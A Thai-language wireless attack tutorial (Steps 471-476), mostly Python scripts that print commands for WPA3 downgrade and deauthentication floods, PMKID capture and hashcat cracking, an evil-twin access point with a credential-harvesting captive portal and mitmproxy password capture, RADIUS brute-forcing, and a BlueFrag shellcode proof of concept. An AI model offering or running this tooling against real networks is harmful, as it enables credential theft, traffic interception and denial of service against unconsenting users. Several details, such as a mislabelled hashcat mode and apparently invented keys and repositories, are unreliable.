# Part 48: Wireless Security Advanced (Steps 471-480)

## ภาพรวม
การทดสอบความปลอดภัยระบบไร้สายขั้นสูง ครอบคลุม WPA3 attacks, PMKID cracking, Evil Twin advanced, Bluetooth LE attacks และ Zigbee/Z-Wave security testing

---

## Step 471: WPA3-SAE Dragonblood Attacks

### อธิบาย
WPA3-SAE (Simultaneous Authentication of Equals) มีช่องโหว่ Dragonblood ที่อนุญาตให้ผู้โจมตีทำ side-channel attacks และ denial of service

```python
#!/usr/bin/env python3
# WPA3 SAE Dragonblood Attack Framework

import subprocess
import json
import time
from dataclasses import dataclass
from typing import Optional

# CVE-2019-9494, CVE-2019-9496
DRAGONBLOOD_ATTACKS = {
    'cache_based_side_channel': {
        'cve': 'CVE-2019-9494',
        'description': 'Cache-based side-channel attack on SAE handshake',
        'tool': 'dragonslayer',
        'severity': 'HIGH'
    },
    'timing_based_side_channel': {
        'cve': 'CVE-2019-9494',
        'description': 'Timing-based side-channel attack',
        'tool': 'dragontime',
        'severity': 'HIGH'
    },
    'denial_of_service': {
        'cve': 'CVE-2019-9496',
        'description': 'Reflection attack / DoS against SAE',
        'tool': 'dragonforce',
        'severity': 'MEDIUM'
    },
    'downgrade_attack': {
        'cve': 'CVE-2019-9495',
        'description': 'Downgrade SAE to WPA2',
        'tool': 'custom',
        'severity': 'HIGH'
    }
}

@dataclass
class WPA3Target:
    bssid: str
    ssid: str
    channel: int
    interface: str

class WPA3DragonbloodTester:
    """WPA3 SAE Dragonblood vulnerability tester"""
    
    def __init__(self, interface: str = 'wlan0'):
        self.interface = interface
        self.monitor_iface = f"{interface}mon"
    
    def enable_monitor_mode(self):
        """เปิดใช้งาน monitor mode"""
        commands = [
            f"airmon-ng check kill",
            f"airmon-ng start {self.interface}"
        ]
        for cmd in commands:
            print(f"[*] Running: {cmd}")
            # subprocess.run(cmd.split(), capture_output=True)
        print(f"[+] Monitor mode: {self.monitor_iface}")
    
    def scan_wpa3_networks(self) -> list:
        """สแกนหา WPA3 networks"""
        print("[*] Scanning for WPA3 networks...")
        # airodump-ng --band abg <interface>
        wpa3_scan_cmd = [
            "airodump-ng",
            "--band", "abg",
            "--output-format", "csv",
            "-w", "/tmp/wpa3_scan",
            self.monitor_iface
        ]
        print(f"[*] Scan command: {' '.join(wpa3_scan_cmd)}")
        
        # จำลอง WPA3 networks ที่พบ
        mock_networks = [
            {'bssid': 'AA:BB:CC:DD:EE:FF', 'ssid': 'Corp-WPA3', 'channel': 6, 'auth': 'SAE'},
            {'bssid': '11:22:33:44:55:66', 'ssid': 'Home-WPA3', 'channel': 11, 'auth': 'SAE+PSK'}
        ]
        return mock_networks
    
    def test_sae_timing_attack(self, target: WPA3Target):
        """ทดสอบ timing-based side-channel"""
        print(f"\n[*] Testing SAE timing attack against {target.ssid}")
        print(f"[*] Target: {target.bssid} on channel {target.channel}")
        
        # Dragontime tool usage
        dragontime_cmd = f"""
# ติดตั้ง dragonslayer
git clone https://github.com/vanhoefm/dragonslayer
cd dragonslayer
pip install -r requirements.txt

# ทดสอบ timing attack
python3 dragontime.py \\
    -i {self.monitor_iface} \\
    -b {target.bssid} \\
    --channel {target.channel} \\
    --timing-attack
"""
        print(dragontime_cmd)
        
        # วิเคราะห์ timing measurements
        timing_analysis = """
# วิเคราะห์ผลลัพธ์
python3 analyze_timing.py \\
    --input timing_measurements.csv \\
    --output group_analysis.json

# หาก timing differences > 0.1ms = vulnerable"""
        print(timing_analysis)
    
    def test_sae_dos(self, target: WPA3Target):
        """ทดสอบ SAE DoS attack"""
        print(f"\n[*] Testing SAE DoS against {target.ssid}")
        
        dos_cmd = f"""
# Dragonforce DoS tool
python3 dragonforce.py \\
    -i {self.monitor_iface} \\
    -b {target.bssid} \\
    --dos-attack

# หรือใช้ aireplay-ng สำหรับ deauth flood
aireplay-ng --deauth 0 -a {target.bssid} {self.monitor_iface}
"""
        print(dos_cmd)
    
    def test_downgrade_attack(self, target: WPA3Target):
        """ทดสอบ WPA3 to WPA2 downgrade"""
        print(f"\n[*] Testing downgrade attack: WPA3 -> WPA2")
        
        # สร้าง rogue AP ที่รองรับ WPA2 เท่านั้น
        downgrade_config = f"""
# สร้าง hostapd config สำหรับ downgrade
cat > /tmp/downgrade_ap.conf << 'EOF'
interface={self.monitor_iface}
ssid={target.ssid}
channel={target.channel}
hw_mode=g
wpa=2
wpa_passphrase=dummy_pass
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
EOF

hostapd /tmp/downgrade_ap.conf &

# ส่ง deauth ไปยัง clients เพื่อบังคับ reconnect
aireplay-ng --deauth 100 -a {target.bssid} {self.monitor_iface}
"""
        print(downgrade_config)
    
    def generate_report(self, findings: list) -> dict:
        """สร้าง vulnerability report"""
        report = {
            'scan_date': time.strftime('%Y-%m-%d %H:%M:%S'),
            'interface': self.interface,
            'findings': findings,
            'recommendations': [
                'Update AP firmware to patch Dragonblood vulnerabilities',
                'Enable SAE-PK (SAE Public Key) for additional security',
                'Use WPA3-Enterprise where possible',
                'Monitor for downgrade attacks using WIDS'
            ]
        }
        return report

# Defense: WPA3 Hardening
WPA3_HARDENING = """
# ตรวจสอบ firmware version
iw dev wlan0 info

# ตรวจสอบว่า AP support SAE-PK
iw list | grep -i sae

# Hostapd config สำหรับ hardened WPA3
cat > /etc/hostapd/hostapd_secure.conf << 'EOF'
ssid=Secure-Corp-Net
wpa=2
wpa_key_mgmt=SAE
rsn_pairwise=CCMP
ieee80211w=2           # PMF required
sae_require_mfp=1
sae_groups=19 20       # Only strong elliptic curves
multicast_to_unicast=1
EOF
"""

if __name__ == '__main__':
    tester = WPA3DragonbloodTester('wlan0')
    tester.enable_monitor_mode()
    
    networks = tester.scan_wpa3_networks()
    for net in networks:
        target = WPA3Target(
            bssid=net['bssid'],
            ssid=net['ssid'],
            channel=net['channel'],
            interface='wlan0mon'
        )
        tester.test_sae_timing_attack(target)
        tester.test_sae_dos(target)
        tester.test_downgrade_attack(target)
```

---

## Step 472: PMKID-Based WPA2 Cracking

### อธิบาย
การ crack WPA2 โดยใช้ PMKID ที่ได้จาก RSN IE ใน beacon frames โดยไม่ต้องรอ 4-way handshake

```python
#!/usr/bin/env python3
# PMKID Attack Framework

import hashlib
import hmac
import struct
import subprocess
from pathlib import Path

PMKID_FORMULA = """
PMKID = HMAC-SHA1-128(PMK, "PMK Name" | AP_MAC | STA_MAC)
โดย:
  PMK = PBKDF2-HMAC-SHA1(password, SSID, 4096, 256 bits)
  PMKID = first 128 bits of HMAC-SHA1
"""

class PMKIDAttacker:
    """PMKID-based WPA2 attack tool"""
    
    def __init__(self, interface: str = 'wlan0'):
        self.interface = interface
        self.hcxdumptool = 'hcxdumptool'
        self.hcxtools = 'hcxtools'
    
    def capture_pmkid(self, target_bssid: str = None, output_file: str = '/tmp/pmkid_capture'):
        """จับ PMKID จาก AP"""
        print("[*] Capturing PMKID...")
        
        # ติดตั้ง hcxdumptool
        install_cmd = """
# ติดตั้ง
apt-get install hcxdumptool hcxtools -y

# หรือ build from source
git clone https://github.com/ZerBea/hcxdumptool
cd hcxdumptool && make && make install

git clone https://github.com/ZerBea/hcxtools
cd hcxtools && make && make install
"""
        print(install_cmd)
        
        if target_bssid:
            # กำหนด target เฉพาะ
            filterfile = '/tmp/target_bssid.txt'
            target_no_colon = target_bssid.replace(':', '')
            
            capture_cmd = f"""
# เขียน target BSSID (ไม่มี colons)
echo "{target_no_colon}" > {filterfile}

# จับ PMKID เฉพาะ target
hcxdumptool \\
    -o {output_file}.pcapng \\
    -i {self.interface} \\
    --filterlist_ap={filterfile} \\
    --filtermode=2 \\
    --enable_status=1
"""
        else:
            # จับทุก AP ในพื้นที่
            capture_cmd = f"""
# จับ PMKID จากทุก AP
hcxdumptool \\
    -o {output_file}.pcapng \\
    -i {self.interface} \\
    --enable_status=3

# หยุดหลังจาก 60 วินาที: Ctrl+C"""
        
        print(capture_cmd)
        return output_file
    
    def convert_to_hashcat(self, pcapng_file: str) -> str:
        """แปลง pcapng เป็น hashcat format"""
        hash_file = pcapng_file.replace('.pcapng', '.hc22000')
        
        convert_cmd = f"""
# แปลงเป็น hashcat format 22000 (รองรับ PMKID + EAPOL)
hcxpcapngtool \\
    -o {hash_file} \\
    --all \\
    {pcapng_file}

# ตรวจสอบ PMKID ที่จับได้
wc -l {hash_file}
head -3 {hash_file}

# Format: WPA*01*PMKID*AP_MAC*STA_MAC*ESSID*..."""
        print(convert_cmd)
        return hash_file
    
    def crack_with_hashcat(self, hash_file: str, wordlist: str = '/usr/share/wordlists/rockyou.txt'):
        """Crack WPA2 PMKID ด้วย hashcat"""
        print("\n[*] Cracking PMKID with hashcat...")
        
        crack_commands = f"""
# Crack ด้วย wordlist
hashcat \\
    -m 22000 \\
    {hash_file} \\
    {wordlist} \\
    --status --status-timer=10

# ด้วย rules (เพิ่มประสิทธิภาพ)
hashcat \\
    -m 22000 \\
    {hash_file} \\
    {wordlist} \\
    -r /usr/share/hashcat/rules/best64.rule \\
    -r /usr/share/hashcat/rules/d3ad0ne.rule

# Brute force WPA2 (8-12 digits)
hashcat \\
    -m 22000 \\
    {hash_file} \\
    -a 3 \\
    "?d?d?d?d?d?d?d?d" \\
    --increment --increment-min=8

# ด้วย PRINCE attack (word-mangling)
hashcat \\
    -m 22000 \\
    {hash_file} \\
    -a 6 \\
    {wordlist} \\
    "?d?d?d"

# ดูผลลัพธ์
hashcat -m 22000 {hash_file} --show
"""
        print(crack_commands)
    
    def calculate_pmkid_manually(self, password: str, ssid: str, ap_mac: str, sta_mac: str) -> str:
        """คำนวณ PMKID ด้วยตัวเอง (สำหรับ verification)"""
        # คำนวณ PMK
        pmk = hashlib.pbkdf2_hmac(
            'sha1',
            password.encode(),
            ssid.encode(),
            4096,
            32
        )
        
        # คำนวณ PMKID
        pmk_name = b"PMK Name"
        ap_mac_bytes = bytes.fromhex(ap_mac.replace(':', ''))
        sta_mac_bytes = bytes.fromhex(sta_mac.replace(':', ''))
        
        data = pmk_name + ap_mac_bytes + sta_mac_bytes
        pmkid = hmac.new(pmk, data, hashlib.sha1).digest()[:16]
        
        return pmkid.hex()
    
    def optimize_cracking(self):
        """เทคนิคเพิ่มความเร็วในการ crack"""
        optimization_tips = """
# สร้าง custom wordlist จาก SSID และข้อมูลสาธารณะ
cewl -d 3 -m 5 https://target-company.com -w company_words.txt

# รวม wordlists
cat /usr/share/wordlists/rockyou.txt \\
    /usr/share/wordlists/SecLists/Passwords/WiFi-WPA/probable-v2-wpa-top4800.txt \\
    company_words.txt \\
    | sort -u > combined_wpa.txt

# ใช้ GPU acceleration
hashcat -m 22000 hashes.hc22000 combined_wpa.txt --force -O

# ตรวจสอบ GPU status
hashcat -I

# WPA2 default password patterns
hashcat -m 22000 hashes.hc22000 -a 3 \\
    "NETGEAR?d?d?d?d" \\
    "Linksys?d?d?d?d" \\
    "TP-LINK_?u?u?u?u"
"""
        print(optimization_tips)

if __name__ == '__main__':
    attacker = PMKIDAttacker('wlan0')
    
    # Capture PMKID
    output = attacker.capture_pmkid(target_bssid='AA:BB:CC:DD:EE:FF')
    
    # Convert and crack
    hash_file = attacker.convert_to_hashcat(f"{output}.pcapng")
    attacker.crack_with_hashcat(hash_file)
    
    # Verify manually
    pmkid = attacker.calculate_pmkid_manually(
        'password123', 'TargetSSID',
        'AA:BB:CC:DD:EE:FF', '11:22:33:44:55:66'
    )
    print(f"[+] Calculated PMKID: {pmkid}")
```

---

## Step 473: Advanced Evil Twin Attack

### อธิบาย
การสร้าง Evil Twin AP ขั้นสูงที่จับ EAP credentials และทำ SSL stripping เพื่อดักจับ traffic

```python
#!/usr/bin/env python3
# Advanced Evil Twin Framework

import os
import subprocess
import threading
from pathlib import Path

class AdvancedEvilTwin:
    """Advanced Evil Twin AP with credential harvesting"""
    
    def __init__(self, interface: str = 'wlan0', inet_iface: str = 'eth0'):
        self.interface = interface
        self.inet_iface = inet_iface
        self.ap_iface = f"{interface}_ap"
    
    def setup_hostapd_wpe(self, target_ssid: str, channel: int = 6):
        """ตั้งค่า hostapd-WPE สำหรับ EAP credential capture"""
        print(f"[*] Setting up Evil Twin: {target_ssid}")
        
        # ติดตั้ง hostapd-wpe
        install_cmd = """
# ติดตั้ง hostapd-wpe
apt-get install hostapd-wpe -y

# หรือ build from source
git clone https://github.com/OpenSecurityResearch/hostapd-wpe
cd hostapd-wpe
# Apply patch to hostapd
"""
        print(install_cmd)
        
        # สร้าง hostapd-wpe config
        config_content = f"""
# /etc/hostapd-wpe/hostapd-wpe.conf
interface={self.interface}
ssid={target_ssid}
channel={channel}
hw_mode=g

# WPA2-Enterprise (EAP)
wpa=2
wpa_key_mgmt=WPA-EAP
rsn_pairwise=CCMP

ieee8021x=1
eap_server=1
eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user
ca_cert=/etc/hostapd-wpe/ca.pem
server_cert=/etc/hostapd-wpe/server.pem
private_key=/etc/hostapd-wpe/server.key
dh_file=/etc/hostapd-wpe/dh

# WPE-specific: log credentials
wpe_logfile=/tmp/wpe_credentials.log
"""
        config_path = '/tmp/evil_twin.conf'
        print(f"[*] Config content:\n{config_content}")
        print(f"[*] Write to: {config_path}")
        
        return config_path
    
    def setup_dhcp_dns(self, subnet: str = '192.168.100.0/24'):
        """ตั้งค่า DHCP และ DNS สำหรับ Evil Twin"""
        dhcp_setup = f"""
# ตั้งค่า IP สำหรับ AP interface
ip addr add 192.168.100.1/24 dev {self.interface}
ip link set {self.interface} up

# dnsmasq config
cat > /tmp/dnsmasq.conf << 'EOF'
interface={self.interface}
dhcp-range=192.168.100.10,192.168.100.100,255.255.255.0,12h
dhcp-option=3,192.168.100.1
dhcp-option=6,192.168.100.1
server=8.8.8.8
log-queries
log-dhcp
address=/#/192.168.100.1
EOF

dnsmasq -C /tmp/dnsmasq.conf

# IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -o {self.inet_iface} -j MASQUERADE
iptables -A FORWARD -i {self.interface} -o {self.inet_iface} -j ACCEPT
iptables -A FORWARD -i {self.inet_iface} -o {self.interface} -m state --state RELATED,ESTABLISHED -j ACCEPT
"""
        print(dhcp_setup)
    
    def setup_captive_portal(self, portal_type: str = 'credential_harvest'):
        """สร้าง captive portal สำหรับจับ credentials"""
        if portal_type == 'credential_harvest':
            portal_html = '''
<!DOCTYPE html>
<html>
<head><title>Network Login</title></head>
<body style="font-family: Arial;">
<div style="max-width:400px;margin:100px auto;text-align:center">
    <h2>Corporate Network Login</h2>
    <form action="/login" method="POST">
        <input type="text" name="username" placeholder="Username" required><br><br>
        <input type="password" name="password" placeholder="Password" required><br><br>
        <button type="submit">Login</button>
    </form>
</div>
</body>
</html>
'''
            print("[*] Captive portal HTML:")
            print(portal_html)
            
            # Flask backend สำหรับรับ credentials
            flask_app = """
from flask import Flask, request, redirect
app = Flask(__name__)

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def catch_all(path):
    return open('portal.html').read()

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    client_ip = request.remote_addr
    
    with open('/tmp/captured_credentials.txt', 'a') as f:
        f.write(f"{client_ip} | {username} | {password}\\n")
    
    return redirect('https://corporate-intranet.com')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
"""
            print("[*] Flask credential capture app:")
            print(flask_app)
    
    def setup_ssl_strip(self):
        """ตั้งค่า SSL stripping ด้วย mitmproxy"""
        ssl_strip_cmds = """
# ใช้ mitmproxy สำหรับ SSL stripping
pip install mitmproxy

# Redirect HTTPS traffic ไปยัง mitmproxy
iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 443 -j REDIRECT --to-port 8080
iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 8080

# เปิด mitmproxy
mitmproxy --mode transparent --showhost

# หรือ mitmweb (web interface)
mitmweb --mode transparent --web-host 0.0.0.0

# ดักจับ credentials ด้วย script
mitmproxy --mode transparent -s capture_creds.py
"""
        print(ssl_strip_cmds)
        
        capture_script = """
# capture_creds.py - mitmproxy addon
from mitmproxy import http
import re

def request(flow: http.HTTPFlow) -> None:
    if flow.request.method == 'POST':
        content = flow.request.content.decode('utf-8', errors='ignore')
        # หา credentials patterns
        patterns = [
            r'password=([^&]+)',
            r'passwd=([^&]+)',
            r'pass=([^&]+)',
            r'pwd=([^&]+)'
        ]
        for pattern in patterns:
            match = re.search(pattern, content)
            if match:
                with open('/tmp/ssl_strip_creds.txt', 'a') as f:
                    f.write(f"URL: {flow.request.url}\\n")
                    f.write(f"Data: {content}\\n---\\n")
"""
        print(capture_script)
    
    def monitor_captured_data(self):
        """Monitor credentials ที่จับได้ real-time"""
        monitor_cmds = """
# ดู WPE credentials
tail -f /tmp/wpe_credentials.log

# ดู captive portal credentials
tail -f /tmp/captured_credentials.txt

# ดู SSL strip credentials
tail -f /tmp/ssl_strip_creds.txt

# ดู network traffic
tcpdump -i wlan0 -w /tmp/evil_twin_capture.pcap
"""
        print(monitor_cmds)

# EAP Credential capture output format
EAP_CAPTURE_FORMAT = """
# hostapd-wpe log format:
# wpe_username: johndoe
# wpe_challenge: 1234567890abcdef
# wpe_response: aabbccdd...
# 
# crack MSCHAPv2 challenge/response:
asleap -C <challenge> -R <response> -W /usr/share/wordlists/rockyou.txt

# หรือ hashcat
echo 'johndoe::::aabbccdd...:1234567890abcdef' > ntlm_hashes.txt
hashcat -m 5500 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt
"""

if __name__ == '__main__':
    twin = AdvancedEvilTwin('wlan0', 'eth0')
    config = twin.setup_hostapd_wpe('CorpWiFi', channel=6)
    twin.setup_dhcp_dns()
    twin.setup_captive_portal()
    twin.setup_ssl_strip()
    twin.monitor_captured_data()
```

---

## Step 474: 802.1X/RADIUS Security Testing

### อธิบาย
การทดสอบความปลอดภัยของ 802.1X authentication และ RADIUS server

```python
#!/usr/bin/env python3
# 802.1X RADIUS Security Tester

from pyrad.client import Client
from pyrad.dictionary import Dictionary
import pyrad.packet
import socket
import struct
import hashlib
import os

RADIUS_ATTACK_TYPES = {
    'credential_brute_force': 'Brute force RADIUS authentication',
    'eap_downgrade': 'Force EAP-MD5 instead of EAP-TLS/PEAP',
    'mitm_radius': 'MITM between client and RADIUS server',
    'rogue_radius': 'Rogue RADIUS server',
    'shared_secret_crack': 'Crack RADIUS shared secret'
}

class RADIUSSecurityTester:
    """802.1X RADIUS security assessment tool"""
    
    def __init__(self, radius_host: str, radius_port: int = 1812, secret: str = 'testing123'):
        self.radius_host = radius_host
        self.radius_port = radius_port
        self.secret = secret
    
    def test_authentication(self, username: str, password: str) -> dict:
        """ทดสอบ RADIUS authentication"""
        print(f"[*] Testing auth: {username}:{password} @ {self.radius_host}")
        
        try:
            # สร้าง RADIUS client
            client = Client(
                server=self.radius_host,
                authport=self.radius_port,
                secret=self.secret.encode()
            )
            
            # สร้าง Access-Request packet
            req = client.CreateAuthPacket(
                code=pyrad.packet.AccessRequest,
                User_Name=username
            )
            req["User-Password"] = req.PwCrypt(password)
            req["NAS-IP-Address"] = "192.168.1.100"
            req["NAS-Port"] = 0
            
            # ส่ง request
            reply = client.SendPacket(req)
            
            if reply.code == pyrad.packet.AccessAccept:
                return {'status': 'SUCCESS', 'username': username, 'password': password}
            else:
                return {'status': 'FAILED', 'username': username}
                
        except Exception as e:
            return {'status': 'ERROR', 'error': str(e)}
    
    def brute_force_radius(self, username: str, wordlist: str):
        """Brute force RADIUS credentials"""
        print(f"[*] Brute forcing RADIUS for user: {username}")
        
        with open(wordlist, 'r', errors='ignore') as f:
            for line in f:
                password = line.strip()
                result = self.test_authentication(username, password)
                
                if result['status'] == 'SUCCESS':
                    print(f"[+] FOUND: {username}:{password}")
                    return result
                    
        print(f"[-] No valid credentials found for {username}")
        return None
    
    def crack_shared_secret(self, packet_file: str, wordlist: str):
        """Crack RADIUS shared secret จาก captured packets"""
        crack_cmd = f"""
# ใช้ radius2john เพื่อแปลง RADIUS packets
radius2john {packet_file} > radius_hashes.txt

# Crack ด้วย john
john radius_hashes.txt \\
    --wordlist={wordlist} \\
    --format=radius

# หรือ hashcat
hashcat -m 1430 radius_hashes.txt {wordlist}
"""
        print(crack_cmd)
    
    def test_eap_methods(self, ssid: str, interface: str = 'wlan0'):
        """ทดสอบ EAP methods ที่ AP รองรับ"""
        print(f"[*] Testing supported EAP methods for: {ssid}")
        
        # ใช้ eap_buster หรือ wlan0 probe
        eap_test_cmd = f"""
# ทดสอบ EAP methods
eapmd5pass -w {interface} -e {ssid}

# ดู EAP types ใน wireshark:
# เปิด capture -> filter: eap
# ดู EAP-Request types

# แต่ละ EAP type:
# 4 = MD5-Challenge (อ่อนแอมาก)
# 13 = EAP-TLS
# 21 = EAP-TTLS
# 25 = PEAP
# 43 = EAP-FAST
"""
        print(eap_test_cmd)
    
    def setup_rogue_radius(self, eap_type: str = 'PEAP'):
        """ตั้งค่า rogue RADIUS server"""
        print(f"[*] Setting up rogue RADIUS server for {eap_type}")
        
        freeradius_config = """
# /etc/freeradius/3.0/eap.conf
eap {
    default_eap_type = peap
    timer_expire = 60
    
    md5 {}
    
    tls-config tls-common {
        private_key_file = /etc/freeradius/3.0/certs/server.key
        certificate_file = /etc/freeradius/3.0/certs/server.pem
        ca_file = /etc/freeradius/3.0/certs/ca.pem
        
        # รับ certificate ทุกแบบ (ไม่ verify client)
        verify_client_cert = no
    }
    
    peap {
        tls = tls-common
        default_eap_type = mschapv2
        copy_request_to_tunnel = no
        use_tunneled_reply = no
    }
    
    mschapv2 {
        send_error = yes
    }
}

# เริ่ม FreeRADIUS ใน debug mode
freeradius -X -f 2>&1 | tee /tmp/radius_debug.log

# ดู captured credentials
grep -E 'User-Name|MS-CHAP' /tmp/radius_debug.log
"""
        print(freeradius_config)
    
    def analyze_radius_packets(self, pcap_file: str):
        """วิเคราะห์ RADIUS packets"""
        analysis_cmd = f"""
# ดู RADIUS packets ใน pcap
tshark \\
    -r {pcap_file} \\
    -Y 'radius' \\
    -T fields \\
    -e radius.code \\
    -e radius.User_Name \\
    -e radius.Reply_Message

# ดู EAP messages
tshark \\
    -r {pcap_file} \\
    -Y 'eap' \\
    -T fields \\
    -e eap.code \\
    -e eap.type \\
    -e eap.identity

# Extract RADIUS secrets
radius2john {pcap_file} > /tmp/radius_secrets.txt
cat /tmp/radius_secrets.txt
"""
        print(analysis_cmd)

if __name__ == '__main__':
    tester = RADIUSSecurityTester(
        radius_host='192.168.1.10',
        secret='corporate_radius_secret'
    )
    
    # ทดสอบ brute force
    tester.brute_force_radius('admin', '/usr/share/wordlists/rockyou.txt')
    
    # ทดสอบ EAP methods
    tester.test_eap_methods('CorpWiFi')
    
    # ตั้งค่า rogue RADIUS
    tester.setup_rogue_radius('PEAP')
```

---

## Step 475: Bluetooth LE (BLE) Security Testing

### อธิบาย
การทดสอบความปลอดภัยของ Bluetooth Low Energy ครอบคลุม KNOB attack, MITM, และ BlueFrag

```python
#!/usr/bin/env python3
# Bluetooth LE Security Testing Framework

import subprocess
import struct
import sys
from bluepy.btle import Scanner, DefaultDelegate, Peripheral, ADDR_TYPE_RANDOM

BLE_ATTACKS = {
    'KNOB': {
        'cve': 'CVE-2019-9506',
        'description': 'Key Negotiation of Bluetooth - force weak encryption key',
        'severity': 'HIGH'
    },
    'BIAS': {
        'cve': 'CVE-2020-10135',
        'description': 'Bluetooth Impersonation AttackS',
        'severity': 'HIGH'
    },
    'BlueFrag': {
        'cve': 'CVE-2020-0022',
        'description': 'Android Bluetooth RCE via L2CAP fragmentation',
        'severity': 'CRITICAL'
    },
    'Sweyntooth': {
        'cve': 'Multiple',
        'description': 'BLE stack vulnerabilities in IoT devices',
        'severity': 'HIGH'
    }
}

class BLESecurityTester:
    """Bluetooth LE security assessment framework"""
    
    def __init__(self, interface: str = 'hci0'):
        self.interface = interface
    
    def scan_ble_devices(self, duration: int = 10) -> list:
        """สแกนหา BLE devices"""
        print(f"[*] Scanning BLE devices for {duration} seconds...")
        
        devices = []
        try:
            scanner = Scanner().withDelegate(DefaultDelegate())
            scan_results = scanner.scan(duration)
            
            for device in scan_results:
                dev_info = {
                    'addr': device.addr,
                    'addr_type': device.addrType,
                    'rssi': device.rssi,
                    'manufacturer': None,
                    'name': None,
                    'services': []
                }
                
                for (adtype, desc, value) in device.getScanData():
                    if adtype == 9:  # Complete Local Name
                        dev_info['name'] = value
                    elif adtype == 255:  # Manufacturer Specific
                        dev_info['manufacturer'] = value
                    elif adtype in [2, 3]:  # Service UUIDs
                        dev_info['services'].append(value)
                
                devices.append(dev_info)
                print(f"[+] Found: {device.addr} | {dev_info.get('name', 'Unknown')} | RSSI: {device.rssi}")
                
        except Exception as e:
            print(f"[-] Scan error: {e}")
            # จำลอง devices สำหรับ demo
            devices = [
                {'addr': 'AA:BB:CC:DD:EE:FF', 'name': 'SmartLock-X200', 'rssi': -65},
                {'addr': '11:22:33:44:55:66', 'name': 'HeartMonitor', 'rssi': -72}
            ]
        
        return devices
    
    def enumerate_services(self, target_addr: str):
        """ระบุ services และ characteristics ของ device"""
        print(f"\n[*] Enumerating services for: {target_addr}")
        
        try:
            peripheral = Peripheral(target_addr, ADDR_TYPE_RANDOM)
            
            for service in peripheral.getServices():
                print(f"  Service: {service.uuid}")
                for char in service.getCharacteristics():
                    properties = char.propertiesToString()
                    print(f"    Char: {char.uuid} | Props: {properties}")
                    
                    # อ่าน value ถ้า readable
                    if 'READ' in properties:
                        try:
                            value = char.read()
                            print(f"      Value: {value.hex()} | {value}")
                        except:
                            pass
            
            peripheral.disconnect()
            
        except Exception as e:
            print(f"[-] Error: {e}")
    
    def test_knob_attack(self, target_addr: str):
        """ทดสอบ KNOB attack (CVE-2019-9506)"""
        print(f"\n[*] Testing KNOB attack against: {target_addr}")
        print("[!] KNOB: Force minimum encryption key entropy (1 byte)")
        
        knob_cmd = """
# ใช้ InternalBlue สำหรับ KNOB attack
git clone https://github.com/seemoo-lab/internalblue
cd internalblue
pip install -r requirements.txt

# KNOB PoC
python3 knob_attack.py --target <target_addr>

# Check if device is vulnerable:
# - Send LMP_max_encryption_key_size_req with size=1
# - If device accepts -> vulnerable
"""
        print(knob_cmd)
    
    def test_bluefrag(self, target_addr: str, android_version: str = '8.0'):
        """ทดสอบ BlueFrag Android RCE (CVE-2020-0022)"""
        print(f"\n[*] Testing BlueFrag against Android {android_version}")
        print(f"[!] Requires: Android 8.0-9.0, attacker in Bluetooth range")
        
        bluefrag_info = f"""
CVE: CVE-2020-0022
Affected: Android 8.0, 8.1, 9.0
Vector: L2CAP packet fragmentation heap overflow

PoC:
git clone https://github.com/bluefrag/poc
cd poc

# ตรวจสอบ Android version
adb shell getprop ro.build.version.release

# ส่ง malformed L2CAP packet
python3 bluefrag.py \\
    --target {target_addr} \\
    --payload /tmp/shellcode.bin

# Verify device is patched:
# Security patch level >= 2020-02-01
adb shell getprop ro.build.version.security_patch
"""
        print(bluefrag_info)
    
    def test_ble_pairing_bypass(self, target_addr: str):
        """ทดสอบ BLE pairing bypass"""
        print(f"\n[*] Testing BLE pairing bypass")
        
        pairing_attacks = f"""
# Just Works pairing bypass
# หาก device ใช้ 'Just Works' pairing -> ไม่มี authentication

# ตรวจสอบด้วย btlejuice
npm install -g btlejuice
btlejuice-proxy -u <ubertooth_interface>
btlejuice -u ws://localhost:8080

# หรือ GATTacker
npm install -g gattacker
ws-intercept  # MITM BLE traffic

# ดู pairing method
# ใน btmon output:
btmon | grep -i 'pairing\\|just works\\|passkey'
"""
        print(pairing_attacks)
    
    def generate_ble_report(self, devices: list) -> dict:
        """สร้าง BLE security report"""
        report = {
            'devices_found': len(devices),
            'vulnerable_devices': [],
            'recommendations': [
                'Update Bluetooth firmware/drivers',
                'Disable Bluetooth when not in use',
                'Use BLE Secure Connections (LE Secure Connections)',
                'Implement certificate-based pairing',
                'Monitor for KNOB/BIAS attack indicators'
            ]
        }
        
        for dev in devices:
            if dev.get('name') and any(kw in dev['name'].lower() 
                                        for kw in ['lock', 'medical', 'health', 'payment']):
                report['vulnerable_devices'].append({
                    'addr': dev['addr'],
                    'name': dev['name'],
                    'risk': 'HIGH - Sensitive device'
                })
        
        return report

if __name__ == '__main__':
    tester = BLESecurityTester('hci0')
    
    devices = tester.scan_ble_devices(duration=10)
    
    if devices:
        target = devices[0]
        tester.enumerate_services(target['addr'])
        tester.test_knob_attack(target['addr'])
        tester.test_ble_pairing_bypass(target['addr'])
    
    report = tester.generate_ble_report(devices)
    print(f"\n[*] Report: {report}")
```

---

## Step 476: Zigbee Security Testing

### อธิบาย
การทดสอบความปลอดภัยของ Zigbee ซึ่งใช้ใน smart home, industrial IoT และ medical devices

```python
#!/usr/bin/env python3
# Zigbee Security Testing Framework

import struct
import binascii

ZIGBEE_VULNERABILITIES = {
    'default_link_keys': 'Zigbee uses well-known default link keys',
    'key_transport_unencrypted': 'Network key may be sent unencrypted during join',
    'replay_attacks': 'Some implementations vulnerable to replay',
    'touchlink_theft': 'Touchlink commissioning allows unauthorized joining',
    'insecure_rejoin': 'Unsecured rejoin allows network infiltration'
}

# Default Zigbee keys (well-known)
DEFAULT_KEYS = {
    'zigbee_default': bytes([0x01, 0x03, 0x05, 0x07, 0x09, 0x0B, 0x0D, 0x0F,
                              0x00, 0x02, 0x04, 0x06, 0x08, 0x0A, 0x0C, 0x0D]),
    'ZLL_master': bytes([0x9F, 0x55, 0x95, 0xF1, 0x02, 0x57, 0x58, 0x28,
                         0xF1, 0xB4, 0xA2, 0x08, 0x9A, 0x56, 0x97, 0x56]),
    'ZLL_certification': bytes([0xC0, 0xC1, 0xC2, 0xC3, 0xC4, 0xC5, 0xC6, 0xC7,
